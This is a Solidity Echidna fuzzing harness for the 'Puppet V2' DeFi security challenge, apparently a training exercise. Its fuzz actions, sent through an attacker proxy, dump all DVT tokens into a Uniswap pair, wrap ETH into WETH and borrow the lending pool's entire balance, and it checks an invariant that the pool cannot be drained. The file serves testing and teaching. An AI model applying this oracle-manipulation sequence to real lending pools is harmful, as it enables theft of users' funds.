// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./EchidnaPuppetV2Setup.sol";

contract EchidnaPuppetV2 is EchidnaPuppetV2Setup {
    event logPosition(string position);
    event logInfo(string reason, uint256 value);

    constructor() public payable {
        init();
    }

    function swapAllDvtForEth() external {
        // PRECONDITIONS
        uint tokenBalanceBefore = token.balanceOf(address(attacker));
        require(
            tokenBalanceBefore > 0,
            "Amount of tokens to be swapped cannot be zero"
        );
        uint ethBalanceBefore = address(attacker).balance;
        // define path
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        // ACTION
        // approve router first
        (bool approvalSuccess, ) = attacker.proxy(
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(router),
                tokenBalanceBefore
            )
        );
        require(approvalSuccess, "Approval unsuccessful");
        // swap tokens
        (bool success, ) = attacker.proxy(
            address(router),
            abi.encodeWithSelector(
                router.swapExactTokensForETH.selector,
                tokenBalanceBefore,
                0,
                path,
                address(attacker),
                uint(-1)
            )
        );
        require(success, "Swap unsuccessful");
        // POSTCONDITIONS
        if (success) {
            // attacker should own less tokens
            uint256 tokenBalanceAfter = token.balanceOf(address(attacker));
            assert(tokenBalanceAfter < tokenBalanceBefore);
            // attacker should own more eth
            uint256 ethBalanceAfter = address(attacker).balance;
            assert(ethBalanceAfter > ethBalanceBefore);
        }
    }

    /**
     * @notice to deposit eth to weth contract on behalf of the attacker contract, then
     * withdraw the same amount of eth deposited from the attacker contract;
     */
    function depositEthToWeth() external payable {
        // Precondition
        require(msg.value > 0, "Cannot send zero ETH");
        uint256 attackerEthBalance = address(attacker).balance;
        require(attackerEthBalance >= msg.value, "Not enough ETH");
        // Action
        // 1: deposit eth to weth contract
        uint256 wethBalanceBefore = weth.balanceOf(address(attacker));
        (bool success, ) = attacker.proxy{value: msg.value}(
            address(weth),
            abi.encodeWithSelector(weth.deposit.selector, "")
        );
        require(success, "Weth deposit failed");
        if (success) {
            emit logPosition("weth.deposit");
            emit logInfo("wethBalanceBefore", wethBalanceBefore);
            // check balances
            uint256 wethBalanceAfter = weth.balanceOf(address(attacker));
            emit logInfo("wethBalanceAfter", wethBalanceAfter);
            assert(wethBalanceAfter > wethBalanceBefore);
        }
        // 2: withdraw eth from attacker as we paid for him
        uint256 ethBalanceBefore = address(attacker).balance;
        (bool transferSucces, ) = attacker.withdrawEth(msg.value);
        // POST CONDITIONS
        require(transferSucces, "Attacker's ETH withdrawal unsuccessful");
        // check balances
        if (transferSucces) {
            emit logPosition("attacker.withdrawEth");
            emit logInfo("ethBalanceBefore", ethBalanceBefore);
            uint256 ethBalanceAfter = address(attacker).balance;
            emit logInfo("ethBalanceAfter", ethBalanceAfter);
            assert(ethBalanceAfter < ethBalanceBefore);
        }
    }

    /**
     * @notice try to borrow all DVT token from the pool
     */
    function borrowDvt() external {
        // PRECONDITIONS
        uint256 poolBalance = token.balanceOf(address(pool));
        require(poolBalance > 0, "Not enough tokens in the pool");
        uint256 attackerWethBalance = weth.balanceOf(address(attacker));
        uint256 wethDepositRequired = pool.calculateDepositOfWETHRequired(
            poolBalance
        );
        require(
            attackerWethBalance >= wethDepositRequired,
            "Not enough WETH to borrow all DVT"
        );
        // ACTION
        // 1. Approval
        (bool wethApproval, ) = attacker.proxy(
            address(weth),
            abi.encodeWithSelector(
                weth.approve.selector,
                address(pool),
                wethDepositRequired
            )
        );
        require(wethApproval, "Weth approval unsuccessful");
        // 2: Borrow all tokens
        (bool borrowSuccess, ) = attacker.proxy(
            address(pool),
            abi.encodeWithSelector(pool.borrow.selector, poolBalance)
        );
        // POSTCONDITIONS
        require(borrowSuccess, "Borrow function has not been successful.");
        // TEST THE INVARIANT
        // uint256 newPoolBalance = token.balanceOf(address(pool));
        // assert(newPoolBalance > 0);
    }

    ////////////////////
    // TEST INVARIANT //
    ////////////////////

    // Invariant: pool cannot be drained
    function testPoolBalance() external view {
        uint256 poolBalanceAfter = token.balanceOf(address(pool));
        assert(poolBalanceAfter > 0);
        // return poolBalanceAfter;
    }

    //////////////////////////////
    // GETTERS FOR HARDHAT TEST //
    //////////////////////////////
    // needed if ./test/puppet-v2/echidna_puppet-v2_setup.js to be run

    // function getAttacker() external view returns (address) {
    //     return address(attacker);
    // }

    // function getWeth() external view returns (address) {
    //     return address(weth);
    // }

    // function getToken() external view returns (address) {
    //     return address(token);
    // }

    // function getPool() external view returns (address) {
    //     return address(pool);
    // }

    // function getUniswapFactory() external view returns (address) {
    //     return address(factory);
    // }

    // function getUniswapRouter() external view returns (address) {
    //     return address(router);
    // }

    // function getUniswapReserves() external view returns (uint256, uint256) {
    //     return
    //         UniswapV2Library.getReserves(
    //             address(factory),
    //             address(weth),
    //             address(token)
    //         );
    // }
}
